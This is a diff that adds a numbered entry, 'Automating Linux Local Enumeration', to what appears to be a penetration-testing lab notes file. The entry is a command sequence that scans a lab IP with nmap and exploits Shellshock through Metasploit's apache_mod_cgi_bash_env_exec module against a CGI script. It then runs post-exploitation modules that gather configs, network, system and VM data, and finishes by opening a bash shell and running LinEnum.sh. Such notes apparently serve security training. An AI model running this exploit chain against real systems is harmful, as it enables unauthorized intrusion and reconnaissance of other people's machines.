@@ -1971,7 +1971,33 @@ pgrep vsftpd
 cat /etc/cron*
 ls -al /etc/cron*
 ```
-
-
+102) Automating Linux Local Enumeration
+```
+ifconfig
+nmap -sV 192.182.85.3
+msfconsole
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set RHOSTS 192.182.85.3
+set TARGETURI /gettime.cgi
+exploit
+background
+use post/linux/gather/enum_configs
+set SESSION 1
+run
+use post/linux/gather/enum_network
+set SESSION 1
+run
+use post/linux/gather/enum_system
+set SESSION 1
+run
+use post/linux/gather/checkvm
+set SESSION 1
+run
+cd /tmp
+shell
+/bin/bash -i
+chmod +x LinEnum.sh
+./LinEnum.sh
+```
 
 
